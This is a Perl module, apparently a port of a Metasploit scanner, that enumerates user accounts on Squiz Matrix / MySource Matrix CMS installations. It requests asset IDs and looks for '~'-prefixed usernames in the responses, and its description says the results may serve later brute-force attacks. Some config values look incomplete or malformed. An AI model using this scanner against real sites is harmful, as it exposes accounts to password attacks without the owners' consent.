package SQUIZ::MSF::SquizMatrixUserEnum;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "SquizMatrixUserEnum";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "#{ASSET}"    => "#{user",
  "DESCRIPTION" => "

        This module attempts to enumerate remote users that exist within

        the Squiz Matrix and MySource Matrix CMS by sending GET requests for asset IDs

        e.g. ?a=14 and searching for a valid username eg \"~root\" or \"~test\" which

        is prefixed by a \"~\" in the response. It will also try to GET the users

        full name or description, or other information. You may wish to modify

        ASSETBEGIN and ASSETEND values for greater results, or set VERBOSE.

        Information gathered may be used for later bruteforce attacks.

      ",
  "METHOD"      => "",
  "MSF_MODULE"  => "squiz_matrix_user_enum",
  "PATH"        => "",
  "PATHS"       => ["#{uri}?a=#{asset}", ""],
  "PAYLOAD"     => "?",
  "REFERENCES"  => ["http://www.osisecurity.com.au/advisories/"],
  "TITLE"       => "Squiz Matrix User Enumeration Scanner",
  VARIABLES => {
    'PATH' =>       {
  DESCRIPTION => "The path to users Squiz Matrix installation",
  VALUE => "/",
},
    'VERBOSE' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'SCANNER',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
